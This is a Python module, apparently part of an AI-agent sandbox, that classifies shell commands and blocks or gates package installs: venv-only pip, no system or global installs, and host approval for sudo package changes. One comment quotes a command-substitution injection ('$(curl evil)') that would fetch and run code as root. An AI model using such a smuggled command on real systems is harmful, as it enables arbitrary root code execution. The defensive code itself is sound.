"""Install policy v2.

Decides whether a shell command that performs a package installation is
allowed. v2 changes vs v1:

* venvs are recognized by their **marker files** (``pyvenv.cfg`` for venvs,
  ``conda-meta/`` for conda envs), not only by remembering creations — so a
  venv made yesterday, by a previous session, or by the human still counts.
* npm/yarn/pnpm ``-g`` detection is token-position-aware: ``npm i pkg -g``
  is caught (the v1 regex missed it).
* ``pipx``, ``poetry``, ``pdm``, ``uv``, ``cargo``, ``go`` are classified
  explicitly (project/user-scoped installs allowed).
* ``conda install`` requires ``-n``/``-p`` (env-scoped); bare conda install
  (which mutates base) is rejected.
* System package managers and global Node installs are rejected as before.

Like the sandbox checks this is static analysis: it makes naive and
accidental installs fail closed, it is not a security boundary against a
determined adversary with exec access (exec itself is opt-in).
"""
from __future__ import annotations

import os
import re
import shlex
from typing import Optional

_INSTALL_HINT = (
    "INSTALL REJECTED: package installation is only allowed inside a Python "
    "virtual environment. Create one with `python3 -m venv .venv` then use "
    "`.venv/bin/pip install <pkg>` (POSIX) or "
    "`.venv\\Scripts\\pip install <pkg>` (Windows), or "
    "`source .venv/bin/activate && pip install <pkg>`. "
    "Project-scoped tools (npm install, pipx, poetry add, uv add) are allowed; "
    "system package managers and global installs are not."
)

# (pattern, rule) — command types that are always rejected outright.
_REJECT_PATTERNS = [
    (re.compile(r"(^|[\s;&|(]\s*)apt(?:-get)?\s+install\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)apk\s+add\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)(?:yum|dnf)\s+(?:-y\s+)?install\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)brew\s+(?:install|cask)\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)pacman\s+-S\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)zypper\s+install\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)emerge\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)snap\s+install\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)gem\s+install\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)choco\s+install\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)winget\s+install\b"), "system_package_manager"),
    (re.compile(r"(^|[\s;&|(]\s*)flatpak\s+install\b"), "system_package_manager"),
]

# pip-family install attempts (need venv scoping).
_PIP_PATTERNS = [
    re.compile(r"(^|[\s;&|(]\s*)pip(?:\d(?:\.\d+)?)?\s+install\b"),
    re.compile(r"(^|[\s;&|(]\s*)python(?:\d(?:\.\d+)?)?(?:\.exe)?\s+-m\s+pip\s+install\b"),
    re.compile(r"(^|[\s;&|(]\s*)uv\s+pip\s+install\b"),
]

# venv creation — tracked for /info display.
VENV_CREATE_RE = re.compile(
    r"\bpython(?:\d(?:\.\d+)?)?(?:\.exe)?\s+-m\s+venv\s+['\"]?([^\s'\"]+)")

# A token that references a pip/python binary from some venv, e.g.
# `.venv/bin/pip`, `.venv/bin/python`, `.venv\\Scripts\\pip.exe`.
# Token must END with the tool name (checked per shlex token).
_VENV_TOOL_RE = re.compile(
    r"(?:^|[/\\])(?:bin|Scripts)[/\\](?:pip|python)(?:\d(?:\.\d+)?)?"
    r"(?:\.exe)?$")

# v2.4.2: an ACTIVATION token — `source .venv/bin/activate`,
# `. venv/bin/activate`, `venv\\Scripts\\Activate.ps1`, and the
# shell variants (activate.bash/.fish/.csh/.xsh/.bat/.nu). The
# rejection hint advertises `source .venv/bin/activate && pip install
# X` as an allowed form, but v2.3-v2.4.1 had no detection for it —
# found live on 2026-10-25 (session 12) and fixed here. The activate
# token's grandparent is the venv root.
_VENV_ACTIVATE_RE = re.compile(
    r"(?:^|[/\\])(?:bin|Scripts)[/\\][Aa]ctivate(?:\.\w+)?$",
    re.IGNORECASE)

# v2.4.5: sudo DISTRIBUTION-PACKAGE installs. v2.4.6 adds REMOVALS
# (user request session 17: "add the removal as you did for the
# package installation") under the SAME forced-approval flow. The
# whole point is the forced gate (api.py gates these REGARDLESS of
# policy), so detection is deliberately tight:
#   * the command must be EXACTLY `sudo <manager> <pkg-op> [args]`
#     (fullmatch after whitespace normalization — no ;, &&, |, redirects,
#     no command chaining: those fall through to rejection);
#   * only install/upgrade-upfront and remove forms of mainstream
#     distro managers (pacman -S*/-R*, apt/apt-get install/remove/
#     purge, dnf/yum install/remove/erase, zypper install/remove/rm,
#     apk add/del/remove). Everything else (queries, file ops, shells)
#     stays rejected;
#   * `sudo <anything else>` (pip, rm, tee, ...) stays rejected — an
#     agent must not reach for root outside package changes.
_SUDO_INSTALL_RE = re.compile(
    r"sudo\s+"
    r"(?:pacman\s+(?:-S\w*|--sync)(?:\s+[^;&|<>$`()\\]*)?"  # -Syu (no-arg
    r"|apt(?:-get)?\s+(?:-[^\s]*\s+)*install\s+"       # apt [flags] install
    r"|(?:dnf|yum)\s+(?:-[^\s]*\s+)*install\s+"
    r"|zypper\s+(?:-[^\s]*\s+)*install\s+"
    r"|apk\s+add\s+)"
    # v2.4.6 hardening: args exclude $, backtick, parens, backslash —
    # command substitution inside an APPROVED root command would run
    # arbitrary code as root (`sudo pacman -S x $(curl evil)`); package
    # names never legitimately contain any of these.
    r"[^;&|<>$`()\\]*")                       # plain package args only

# v2.4.6: the removal twin — same shape discipline (single invocation,
# fullmatch, plain package args only), same approval + countdown +
# security-panel setting on the api side. pacman -R* covers -R/-Rs/
# -Rns/-Rdd and friends; `apt remove` REQUIRES an argument (the bare
# form falls through to rejection) exactly like `apt install` does;
# zypper's `rm` alias is included because it is a real removal op
# there, NOT the file-remover (which never appears in this position).
_SUDO_REMOVE_RE = re.compile(
    r"sudo\s+"
    r"(?:pacman\s+(?:-R\w*|--remove)(?:\s+[^;&|<>$`()\\]*)?"
    r"|apt(?:-get)?\s+(?:-[^\s]*\s+)*(?:remove|purge)\s+"
    r"|(?:dnf|yum)\s+(?:-[^\s]*\s+)*(?:remove|erase)\s+"
    r"|zypper\s+(?:-[^\s]*\s+)*(?:remove|rm)\s+"
    r"|apk\s+(?:del|remove)\s+)"
    r"[^;&|<>$`()\\]*")    # same v2.4.6 substitution hardening

# Combined shape: sandbox.py imports this ONE regex for its sudo-token
# exemption, so installs and removals stay in sync automatically.
_SUDO_PKG_RE = re.compile(
    "(?:%s|%s)" % (_SUDO_INSTALL_RE.pattern, _SUDO_REMOVE_RE.pattern))

# sudo must be the FIRST token (the actual invocation). `echo sudo is
# a word` runs echo, not sudo; `cd /x && sudo pacman -S y` is a chain
# and therefore NOT a package-install command — it falls through to
# the plain system_package_manager rejection below (fail closed).
_SUDO_FIRST_RE = re.compile(r"^sudo(?:\s|$)")

_SUDO_HINT = (
    "SUDO REJECTED: only DISTRIBUTION PACKAGE CHANGES may use sudo — "
    "single commands of the form `sudo pacman -S|-R <pkg>` / `sudo apt "
    "install|remove <pkg>` / `sudo dnf|yum|zypper install|remove <pkg>` / "
    "`sudo apk add|del <pkg>`. Those ALWAYS require host approval "
    "(2-minute countdown). Anything else under sudo is not allowed: chain "
    "a second command, redirect output, or mention anything besides "
    "package names and it stops being a package change and becomes a "
    "rejected sudo command."
)

# npm/yarn/pnpm family.
_NODE_INSTALL = re.compile(r"(^|[\s;&|(]\s*)(npm|yarn|pnpm|bun)\s+")
# Project/user-scoped installers that are always fine.
_SCOPED_INSTALLERS = (
    re.compile(r"(^|[\s;&|(]\s*)pipx\s+install\b"),
    re.compile(r"(^|[\s;&|(]\s*)poetry\s+(?:add|install)\b"),
    re.compile(r"(^|[\s;&|(]\s*)pdm\s+add\b"),
    re.compile(r"(^|[\s;&|(]\s*)uv\s+(?:add|tool\s+install)\b"),
    re.compile(r"(^|[\s;&|(]\s*)cargo\s+install\b"),
    re.compile(r"(^|[\s;&|(]\s*)go\s+install\b"),
)
# conda: env-scoped only.
_CONDA_INSTALL = re.compile(r"(^|[\s;&|(]\s*)conda\s+install\b")
_CONDA_ENV_SCOPED = re.compile(r"\bconda\s+install\b.*(?:\s-n\s|\s--name\s|\s-p\s|\s--prefix\s)")


def _looks_like_venv(path: str) -> bool:
    """True if `path` is (or lives inside) a venv or conda env.

    Walks up at most 4 parents looking for pyvenv.cfg (venv) or
    conda-meta/ (conda environment).
    """
    p = os.path.normpath(path)
    for _ in range(4):
        try:
            if os.path.isfile(os.path.join(p, "pyvenv.cfg")):
                return True
            if os.path.isdir(os.path.join(p, "conda-meta")):
                return True
        except OSError:
            return False
        parent = os.path.dirname(p)
        if parent == p:
            break
        p = parent
    return False


class InstallPolicy:
    """Classifies install commands. Stateless (marker-based detection).

    v2.4.3: two distinct venv sets —
      * ``venvs`` — the CONFIGURED allow-list (GUI "Install venvs"
        card / settings["venvs"], seeded at server start, synced by
        the GUI on add/remove).
      * ``discovered_venvs`` — venvs agents created via
        ``python -m venv X`` this run: runtime observations, never
        persisted, pruned from /info when their pyvenv.cfg vanishes.
    Before the split both lived in ONE set, which meant the GUI never
    showed agent-created venvs (it renders settings["venvs"]) and a
    GUI sync overwrote the runtime discoveries on the running server.
    """

    def __init__(self, tracked_venvs: Optional[list] = None):
        self.venvs: set = set(tracked_venvs or [])
        self.discovered_venvs: set = set()

    def reset(self) -> None:
        self.venvs.clear()
        self.discovered_venvs.clear()

    def note_venv(self, venv_abs: str) -> None:
        self.discovered_venvs.add(venv_abs)

    def _known_venv_roots(self) -> set:
        """Union of configured + discovered roots (scoping checks)."""
        return self.venvs | self.discovered_venvs

    def pre_exec(self, command: str, cwd: str) -> Optional[dict]:
        """Inspect a command before execution.

        Returns None if allowed, else {"rule": str, "warning": str}.
        Side effect: remembers venvs created by `python -m venv X`.
        """
        # 1) Track venv creation first (one-liners like
        #    `python -m venv v && v/bin/pip install x` must work).
        #    v2.4.3: creations land in DISCOVERED (runtime), not the
        #    configured allow-list.
        for m in VENV_CREATE_RE.finditer(command):
            raw = m.group(1).strip("'\"")
            self.discovered_venvs.add(os.path.abspath(os.path.join(cwd, raw)))

        try:
            tokens = shlex.split(command, posix=(os.name != "nt"))
        except ValueError:
            tokens = command.split()

        # 1.5) v2.4.5: sudo distribution-package installs — a THIRD verdict
        # state. v2.4.6: removals join under the same gate (the verb
        # tells the api layer which op label to use). Detected BEFORE
        # _REJECT_PATTERNS (a bare `pacman -S` would otherwise be
        # rejected as system_package_manager, hiding the sudo path).
        # Whole-command fullmatch only: anything more
        # complex than the single install/remove invocation falls
        # through to rejection below (fail closed).
        normalized = " ".join(command.split())
        if _SUDO_FIRST_RE.match(normalized):
            if _SUDO_INSTALL_RE.fullmatch(normalized):
                return {"rule": "sudo_package_install",
                        "sudo_verb": "install",
                        "needs_sudo_approval": True,
                        "warning": "Distribution package INSTALL via sudo — "
                                   "requires host approval with a 2-minute "
                                   "countdown, regardless of approval policy."}
            if _SUDO_REMOVE_RE.fullmatch(normalized):
                return {"rule": "sudo_package_remove",
                        "sudo_verb": "remove",
                        "needs_sudo_approval": True,
                        "warning": "Distribution package REMOVAL via sudo — "
                                   "requires host approval with a 2-minute "
                                   "countdown, regardless of approval policy."}
            return self._reject("sudo_not_package_install", _SUDO_HINT)

        # 2) System-level managers: always rejected.
        for pat, rule in _REJECT_PATTERNS:
            if pat.search(command):
                return self._reject(rule)

        # 3) Any install attempt?
        # A venv-style tool token (`X/bin/pip install ...`) is itself an
        # install attempt — detect via per-token matching.
        tool_tokens = [t for t in tokens if _VENV_TOOL_RE.search(t)]
        pip_attempt = (any(p.search(command) for p in _PIP_PATTERNS)
                        or bool(tool_tokens))
        node_attempt = _NODE_INSTALL.search(command) and any(
            re.search(r"\b(install|i|add|global)\b", t) for t in tokens)
        scoped = any(p.search(command) for p in _SCOPED_INSTALLERS)
        conda_attempt = _CONDA_INSTALL.search(command)

        if not (pip_attempt or node_attempt or scoped or conda_attempt):
            return None  # not an install command at all

        # 4) pip-family: allowed only when the referenced tool lives in a
        #    (marker-detected, configured or discovered) venv.
        if pip_attempt:
            # 4a) Direct tool tokens: `X/bin/pip install ...`.
            for tool in tool_tokens:
                tool_abs = os.path.normpath(os.path.join(cwd, tool))
                if _looks_like_venv(tool_abs) or any(
                        os.path.normcase(tool_abs).startswith(
                            os.path.normcase(v) + os.sep)
                        for v in self._known_venv_roots()):
                    return None  # venv-scoped install
            # 4b) v2.4.2 activation form: `source <venv>/bin/activate &&
            #     pip install X` (the form _INSTALL_HINT advertises).
            #     The activate token's grandparent must be a (marker or
            #     tracked) venv AND the activation must precede the first
            #     pip attempt in the token stream (activation afterwards
            #     scopes nothing). Whole-command granularity: a later
            #     `deactivate && pip install Y` is beyond static analysis.
            first_pip = self._first_pip_index(tokens)
            for i, t in enumerate(tokens):
                if not _VENV_ACTIVATE_RE.search(t):
                    continue
                if first_pip is not None and i > first_pip:
                    continue  # activated too late to scope the install
                vroot = os.path.normpath(os.path.join(
                    cwd, os.path.dirname(os.path.dirname(t))))
                if _looks_like_venv(vroot) or any(
                        os.path.normcase(vroot) == os.path.normcase(v)
                        or os.path.normcase(vroot).startswith(
                            os.path.normcase(v) + os.sep)
                        for v in self._known_venv_roots()):
                    return None  # venv-scoped install (activated)
            return self._reject("install_not_in_venv")

        # 5) Node family: local installs OK, global installs rejected.
        if node_attempt and not scoped:
            if self._node_global(tokens):
                return self._reject("global_node_install")
            return None

        # 6) Project/user-scoped installers: allowed.
        if scoped:
            return None

        # 7) conda: only env-scoped installs.
        if conda_attempt:
            if _CONDA_ENV_SCOPED.search(command):
                return None
            return self._reject(
                "conda_base_install",
                "conda install is only allowed with -n/--name or -p/--prefix "
                "(it would otherwise mutate the base environment)."
            )

        return None

    @staticmethod
    def _first_pip_index(tokens: list) -> "int | None":
        """Index of the first token that starts a pip-family install.

        Used by the activation-form check (4b): activation must PRECEDE
        the install to scope it. Recognizes `pip`, `pip3`, `pip3.12`,
        venv tool tokens (`.venv/bin/pip`), `python -m pip`, and
        `uv pip`. Returns None when no pip attempt is found.
        """
        for i, t in enumerate(tokens):
            if re.fullmatch(r"pip(?:\d(?:\.\d+)?)?", t):
                return i
            if _VENV_TOOL_RE.search(t):
                return i
            if re.fullmatch(r"(?:python(?:\d(?:\.\d+)?)?(?:\.exe)?|uv)", t):
                rest = tokens[i + 1:i + 4]
                if t == "uv":
                    if rest[:1] == ["pip"]:
                        return i
                elif "-m" in rest and "pip" in rest:
                    return i
        return None

    @staticmethod
    def _node_global(tokens: list) -> bool:
        """Position-aware global-install detection for npm/yarn/pnpm/bun."""
        try:
            idx = 0
            while idx < len(tokens):
                tok = tokens[idx]
                if tok not in ("npm", "yarn", "pnpm", "bun"):
                    idx += 1
                    continue
                rest = tokens[idx + 1:]
                # yarn global add pkg
                if tok == "yarn" and rest[:2] == ["global", "add"]:
                    return True
                if tok == "yarn":
                    idx += 1
                    continue
                # npm/pnpm/bun install|i|add ... then scan until "--"
                if rest and rest[0] in ("install", "i", "add", "unlink"):
                    for t in rest[1:]:
                        if t == "--":
                            break
                        if t in ("-g", "--global"):
                            return True
                idx += 1
            return False
        except Exception:
            return True  # fail closed

    @staticmethod
    def _reject(rule: str, warning: str = "") -> dict:
        return {"rule": rule, "warning": warning or _INSTALL_HINT}
